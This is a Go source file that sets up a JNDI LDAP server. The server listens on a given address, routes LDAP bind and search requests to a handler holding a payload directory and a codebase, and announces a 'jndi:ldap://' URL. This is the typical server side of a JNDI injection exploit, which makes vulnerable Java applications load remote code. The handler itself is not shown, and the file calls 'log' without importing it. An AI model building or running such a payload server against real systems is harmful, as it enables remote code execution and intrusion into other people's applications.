package jndi

import (
	"fmt"
	"github.com/For-ACGN/ldapserver"
	"net"
	"sync"
	"time"
)

type JndiServer struct {

	addr string
	payloadDir string
	codeBase string
	ldapListener net.Listener
	ldapHandler  *LdapServerHandler
	ldapServer   *ldapserver.Server
}

func NewJndiServer(payloadDir string,ldapAddress string,codeBase string) (*JndiServer,error) {

	// initialize ldap server
	ldapListener, err := net.Listen("tcp", ldapAddress)

	if err != nil {

		errS := fmt.Sprintf("failed to create ldap listener on address:%s",ldapAddress)
		log.Println(errS)
		return nil,fmt.Errorf(errS)
	}

	ldapHandler := &LdapServerHandler{
		payloadDir: payloadDir,
		codeBase:   codeBase,
		tokens:     make(map[string]int64, 16),
		tokensMu: sync.Mutex{},
	}

	ldapRoute := ldapserver.NewRouteMux()
	ldapRoute.Bind(ldapHandler.handleBind)
	ldapRoute.Search(ldapHandler.handleSearch)
	ldapServer := ldapserver.NewServer()
	ldapServer.Handle(ldapRoute)
	ldapServer.ReadTimeout = time.Minute
	ldapServer.WriteTimeout = time.Minute

	return &JndiServer{
		addr:ldapAddress,
		payloadDir:payloadDir,
		codeBase:codeBase,
		ldapListener: ldapListener,
		ldapHandler:  ldapHandler,
		ldapServer:   ldapServer,
	},nil
}

func (s *JndiServer) Start() error {

	log.Infof("JndiLdap server starting on directory: %s,codebase:%s \nListening on jndi:ldap://%s\n", s.payloadDir,s.codeBase, s.addr)
	return s.ldapServer.Serve(s.ldapListener)
}


